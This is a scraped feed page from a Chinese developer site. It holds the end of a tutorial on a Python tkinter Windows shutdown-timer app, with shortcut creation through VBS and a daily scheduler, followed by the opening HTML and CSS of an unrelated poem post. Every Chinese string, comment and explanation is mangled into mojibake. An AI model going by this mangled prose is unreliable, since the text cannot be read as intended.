            vbs_content = <span class="hljs-string">f"""Set WshShell = CreateObject("WScript.Shell")
Set oShellLink = WshShell.CreateShortcut("<span class="hljs-subst">{desktop_path}</span>\\<span class="hljs-subst">{shortcut_name}</span>.lnk")
oShellLink.TargetPath = "<span class="hljs-subst">{bat_path}</span>"
oShellLink.WindowStyle = 1
oShellLink.Description = "å®šæ—¶å…³æœºå¿«æ·æ–¹å¼"
oShellLink.Save
"""</span>
            
            <span class="hljs-comment"># ä¿å­˜æ‰¹å¤„ç†æ–‡ä»¶</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(bat_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'gbk'</span>) <span class="hljs-keyword">as</span> f:
                f.write(bat_content)
                
            <span class="hljs-comment"># ä¿å­˜VBSè„šæœ¬å¹¶åˆ›å»ºå¿«æ·æ–¹å¼</span>
            vbs_path = os.path.join(desktop_path, <span class="hljs-string">"create_shortcut.vbs"</span>)
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(vbs_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'gbk'</span>) <span class="hljs-keyword">as</span> f:
                f.write(vbs_content)
                
            subprocess.run(<span class="hljs-string">f'cscript //nologo "<span class="hljs-subst">{vbs_path}</span>"'</span>, shell=<span class="hljs-literal">True</span>)
            
            <span class="hljs-comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>
            os.remove(vbs_path)
            
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å¿«æ·æ–¹å¼å·²åˆ›å»ºåˆ°æ¡Œé¢ï¼\n"</span>
                <span class="hljs-string">f"æ–‡ä»¶åï¼š<span class="hljs-subst">{shortcut_name}</span>.lnk\n"</span>
                <span class="hljs-string">f"åŒå‡»å³å¯è®¾ç½® <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³æœº"</span>)
            
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å¿«æ·æ–¹å¼å·²åˆ›å»ºï¼š<span class="hljs-subst">{shortcut_name}</span>"</span>)
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"åˆ›å»ºå¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_shortcut_time</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æµ‹è¯•å¿«æ·æ–¹å¼è®¾ç½®çš„å…³æœºæ—¶é—´"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            subprocess.run(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>, shell=<span class="hljs-literal">True</span>)
            
            messagebox.showinfo(<span class="hljs-string">"æµ‹è¯•æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å·²è®¾ç½®æµ‹è¯•å…³æœºï¼\n"</span>
                <span class="hljs-string">f"ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­\n"</span>
                <span class="hljs-string">f"å¦‚éœ€å–æ¶ˆè¯·ä½¿ç”¨'å–æ¶ˆå®šæ—¶å…³æœº'æŒ‰é’®"</span>)
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"æµ‹è¯•å¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toggle_schedule</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å¯åŠ¨/åœæ­¢å®šæ—¶ä»»åŠ¡"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.is_scheduled:
            <span class="hljs-keyword">try</span>:
                hour = <span class="hljs-built_in">int</span>(self.schedule_hour.get() <span class="hljs-keyword">or</span> <span class="hljs-number">22</span>)
                minute = <span class="hljs-built_in">int</span>(self.schedule_minute.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
                
                <span class="hljs-keyword">if</span> hour &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> hour &gt; <span class="hljs-number">23</span> <span class="hljs-keyword">or</span> minute &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> minute &gt; <span class="hljs-number">59</span>:
                    messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„æ—¶é—´"</span>)
                    <span class="hljs-keyword">return</span>
                    
                <span class="hljs-comment"># å¯åŠ¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹</span>
                self.shutdown_thread = threading.Thread(
                    target=self.schedule_shutdown_task,
                    args=(hour, minute),
                    daemon=<span class="hljs-literal">True</span>
                )
                self.shutdown_thread.start()
                
                self.is_scheduled = <span class="hljs-literal">True</span>
                self.schedule_btn.config(text=<span class="hljs-string">"åœæ­¢å®šæ—¶ä»»åŠ¡"</span>)
                
                <span class="hljs-comment"># æ›´æ–°çŠ¶æ€æ˜¾ç¤º</span>
                now = datetime.now()
                target_time = datetime(now.year, now.month, now.day, hour, minute)
                <span class="hljs-keyword">if</span> target_time &lt; now:
                    target_time += timedelta(days=<span class="hljs-number">1</span>)
                    
                self.task_status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨"</span>)
                self.next_time_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"ä¸‹æ¬¡å…³æœºæ—¶é—´ï¼š<span class="hljs-subst">{target_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M'</span>)}</span>"</span>)
                
                messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                    <span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨ï¼\n"</span>
                    <span class="hljs-string">f"æ¯å¤© <span class="hljs-subst">{hour:02d}</span>:<span class="hljs-subst">{minute:02d}</span> è‡ªåŠ¨å…³æœº\n"</span>
                    <span class="hljs-string">f"æ³¨æ„ï¼šè¿™æ˜¯ç¨‹åºæ¨¡æ‹Ÿçš„å®šæ—¶ä»»åŠ¡ï¼Œå…³é—­æœ¬ç¨‹åºå°†åœæ­¢"</span>)
                
                self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨ï¼šæ¯å¤© <span class="hljs-subst">{hour:02d}</span>:<span class="hljs-subst">{minute:02d}</span>"</span>)
                
            <span class="hljs-keyword">except</span> ValueError:
                messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># åœæ­¢å®šæ—¶ä»»åŠ¡</span>
            self.is_scheduled = <span class="hljs-literal">False</span>
            self.schedule_btn.config(text=<span class="hljs-string">"å¯åŠ¨å®šæ—¶ä»»åŠ¡"</span>)
            self.task_status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶ä»»åŠ¡å·²åœæ­¢"</span>)
            self.next_time_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">""</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶ä»»åŠ¡å·²åœæ­¢"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">schedule_shutdown_task</span>(<span class="hljs-params">self, target_hour, target_minute</span>):
        <span class="hljs-string">"""å®šæ—¶ä»»åŠ¡çº¿ç¨‹å‡½æ•°"""</span>
        <span class="hljs-keyword">while</span> self.is_scheduled:
            <span class="hljs-keyword">try</span>:
                now = datetime.now()
                
                <span class="hljs-comment"># è®¡ç®—ä»Šå¤©çš„ç›®æ ‡æ—¶é—´</span>
                target_time = datetime(now.year, now.month, now.day, target_hour, target_minute)
                
                <span class="hljs-comment"># å¦‚æœä»Šå¤©çš„æ—¶é—´å·²è¿‡ï¼Œè®¾ç½®ä¸ºæ˜å¤©</span>
                <span class="hljs-keyword">if</span> target_time &lt; now:
                    target_time += timedelta(days=<span class="hljs-number">1</span>)
                
                <span class="hljs-comment"># è®¡ç®—ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰</span>
                wait_seconds = (target_time - now).total_seconds()
                
                <span class="hljs-comment"># æ¯éš”10ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œä»¥ä¾¿åŠæ—¶å“åº”åœæ­¢å‘½ä»¤</span>
                <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(wait_seconds / <span class="hljs-number">10</span>)):
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.is_scheduled:
                        <span class="hljs-keyword">return</span>
                    time.sleep(<span class="hljs-number">10</span>)
                
                <span class="hljs-comment"># ç­‰å¾…å‰©ä½™æ—¶é—´</span>
                remaining = wait_seconds % <span class="hljs-number">10</span>
                <span class="hljs-keyword">if</span> remaining &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> self.is_scheduled:
                    time.sleep(remaining)
                
                <span class="hljs-comment"># æ‰§è¡Œå…³æœº</span>
                <span class="hljs-keyword">if</span> self.is_scheduled:
                    subprocess.run(<span class="hljs-string">"shutdown -s -t 60"</span>, shell=<span class="hljs-literal">True</span>)
                    
                    <span class="hljs-comment"># æ›´æ–°çŠ¶æ€</span>
                    self.root.after(<span class="hljs-number">0</span>, <span class="hljs-keyword">lambda</span>: self.task_status_var.<span class="hljs-built_in">set</span>(
                        <span class="hljs-string">f"å·²æ‰§è¡Œå…³æœºå‘½ä»¤ï¼ä¸‹æ¬¡å°†åœ¨æ˜å¤© <span class="hljs-subst">{target_hour:02d}</span>:<span class="hljs-subst">{target_minute:02d}</span>"</span>))
                    
                    <span class="hljs-comment"># é‡ç½®ä¸ºæ˜å¤©</span>
                    time.sleep(<span class="hljs-number">65</span>)  <span class="hljs-comment"># ç­‰å¾…å…³æœºæ‰§è¡Œæ—¶é—´</span>
                    
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡é”™è¯¯ï¼š<span class="hljs-subst">{e}</span>"</span>)
                <span class="hljs-keyword">break</span>
                
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_schedule_shutdown</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æµ‹è¯•å®šæ—¶å…³æœºï¼ˆç«‹å³å…³æœºï¼Œä½†ç»™äºˆå–æ¶ˆæ—¶é—´ï¼‰"""</span>
        response = messagebox.askyesno(<span class="hljs-string">"ç¡®è®¤æµ‹è¯•"</span>, 
            <span class="hljs-string">"å°†è®¾ç½®60ç§’åå…³æœºè¿›è¡Œæµ‹è¯•\nè¯·ç¡®ä¿å·²ä¿å­˜æ‰€æœ‰å·¥ä½œ\n\næ˜¯å¦ç»§ç»­ï¼Ÿ"</span>)
        
        <span class="hljs-keyword">if</span> response:
            subprocess.run(<span class="hljs-string">"shutdown -s -t 60"</span>, shell=<span class="hljs-literal">True</span>)
            messagebox.showinfo(<span class="hljs-string">"æµ‹è¯•å¼€å§‹"</span>, 
                <span class="hljs-string">"å·²è®¾ç½®60ç§’åå…³æœº\n"</span>
                <span class="hljs-string">"å¦‚éœ€å–æ¶ˆè¯·ä½¿ç”¨'å–æ¶ˆå®šæ—¶å…³æœº'æŒ‰é’®"</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"æµ‹è¯•å…³æœºå·²è®¾ç½®ï¼š60ç§’åå…³é—­"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    root = tk.Tk()
    app = ShutdownTimerApp(root)
    root.mainloop()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<h3 data-id="heading-6">åŠŸèƒ½è¯´æ˜</h3>
<h4 data-id="heading-7">æ–¹æ³•ä¸€ï¼šå‘½ä»¤è¡Œè®¾ç½®</h4>
<ul>
<li>æä¾›é¢„è®¾æ—¶é—´æŒ‰é’®ï¼ˆ5åˆ†é’Ÿã€30åˆ†é’Ÿã€1å°æ—¶ç­‰ï¼‰</li>
<li>æ”¯æŒè‡ªå®šä¹‰å°æ—¶å’Œåˆ†é’Ÿè®¾ç½®</li>
<li>å®æ—¶æ˜¾ç¤ºå°†è¦æ‰§è¡Œçš„å‘½ä»¤</li>
<li>è®¾ç½®å’Œå–æ¶ˆæŒ‰é’®</li>
</ul>
<h4 data-id="heading-8">æ–¹æ³•äºŒï¼šåˆ›å»ºå¿«æ·æ–¹å¼</h4>
<ul>
<li>è‡ªå®šä¹‰å¿«æ·æ–¹å¼åç§°</li>
<li>è®¾ç½®å…³æœºæ—¶é—´</li>
<li>é¢„è§ˆå¿«æ·æ–¹å¼å†…å®¹</li>
<li>åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼</li>
<li>æµ‹è¯•å¿«æ·æ–¹å¼åŠŸèƒ½</li>
</ul>
<h4 data-id="heading-9">æ–¹æ³•ä¸‰ï¼šå®šæ—¶ä»»åŠ¡ï¼ˆç®€åŒ–ç‰ˆï¼‰</h4>
<ul>
<li>è®¾ç½®æ¯å¤©å›ºå®šæ—¶é—´è‡ªåŠ¨å…³æœº</li>
<li>æ¨¡æ‹ŸWindowsä»»åŠ¡è®¡åˆ’åŠŸèƒ½</li>
<li>æ˜¾ç¤ºä¸‹æ¬¡å…³æœºæ—¶é—´</li>
<li>å¯åŠ¨/åœæ­¢å®šæ—¶ä»»åŠ¡</li>
<li>æµ‹è¯•åŠŸèƒ½</li>
</ul>
<h3 data-id="heading-10">ä½¿ç”¨è¯´æ˜</h3>
<ol>
<li>
<p><strong>è¿è¡Œç¨‹åº</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python shutdown_timer.py
</code></pre>
</li>
<li>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>ç¨‹åºéœ€è¦Windowsç³»ç»Ÿæ”¯æŒ</li>
<li>æ–¹æ³•ä¸‰ä¸ºPythonæ¨¡æ‹Ÿå®ç°ï¼Œå…³é—­ç¨‹åºä¼šåœæ­¢å®šæ—¶ä»»åŠ¡</li>
<li>çœŸå®çš„Windowsä»»åŠ¡è®¡åˆ’éœ€è¦ç®¡ç†å‘˜æƒé™å’Œæ›´å¤æ‚çš„é…ç½®</li>
</ul>
</li>
<li>
<p><strong>å®‰å…¨æé†’</strong>ï¼š</p>
<ul>
<li>å®šæ—¶å…³æœºå‰è¯·ä¿å­˜å¥½æ‰€æœ‰å·¥ä½œ</li>
<li>æµ‹è¯•æ—¶å»ºè®®è®¾ç½®è¾ƒçŸ­æ—¶é—´ï¼ˆå¦‚5åˆ†é’Ÿï¼‰</li>
<li>è®°ä½å¯ä»¥ä½¿ç”¨<code>shutdown -a</code>å‘½ä»¤æˆ–ç¨‹åºçš„å–æ¶ˆåŠŸèƒ½</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11"><strong>é‡è¦æé†’</strong></h4>
<ul>
<li><strong>ä¿å­˜å·¥ä½œ</strong>ï¼šåœ¨è®¾ç½®è‡ªåŠ¨å…³æœºå‰ï¼Œè¯·åŠ¡å¿…ä¿å­˜å¥½æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶å’Œå·¥ä½œè¿›åº¦ï¼Œé˜²æ­¢æ•°æ®ä¸¢å¤±ã€‚</li>
<li><strong>å–æ¶ˆå‘½ä»¤</strong>ï¼šè®°ä½å–æ¶ˆå‘½ä»¤ <code>shutdown -a</code>ï¼Œæˆ–è€…å»ä»»åŠ¡è®¡åˆ’ç¨‹åºé‡Œç¦ç”¨ä»»åŠ¡ï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚</li>
</ul>
<p><strong>æ€»ç»“å»ºè®®</strong>ï¼š</p>
<ul>
<li><strong>ä¸´æ—¶ç”¨ä¸€æ¬¡</strong>ï¼šç”¨ <strong>æ–¹æ³•ä¸€</strong> è¿è¡Œå‘½ä»¤ã€‚</li>
<li><strong>ç»å¸¸å›ºå®šæ—¶é—´ç”¨</strong>ï¼šç”¨ <strong>æ–¹æ³•äºŒ</strong> åˆ›å»ºå¿«æ·æ–¹å¼ã€‚</li>
<li><strong>é•¿æœŸè§„å¾‹æ€§å®šæ—¶</strong>ï¼šç”¨ <strong>æ–¹æ³•ä¸‰</strong> ä»»åŠ¡è®¡åˆ’ç¨‹åºã€‚</li>
<li><strong>æ€•éº»çƒ¦ï¼Œå–œæ¬¢ç‚¹é¼ æ ‡</strong>ï¼šç”¨ <strong>æ–¹æ³•å››</strong> ç¬¬ä¸‰æ–¹è½¯ä»¶ã€‚</li>
</ul>
<p>é€‰æ‹©æœ€é€‚åˆä½ çš„æ–¹æ³•å³å¯ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šå››æ—¶æ­Œã€‹]]></title>    <link>https://juejin.cn/post/7592520539152941065</link>    <guid>https://juejin.cn/post/7592520539152941065</guid>    <pubDate>2026-01-08T02:29:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592520539152941065" data-draft-id="7592582130593923123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šå››æ—¶æ­Œã€‹"/> <meta itemprop="keywords" content="æ˜é‡‘Â·æ—¥æ–°è®¡åˆ’"/> <meta itemprop="datePublished" content="2026-01-08T02:29:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šå››æ—¶æ­Œã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:29:28.000Z" title="Thu Jan 08 2026 02:29:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body 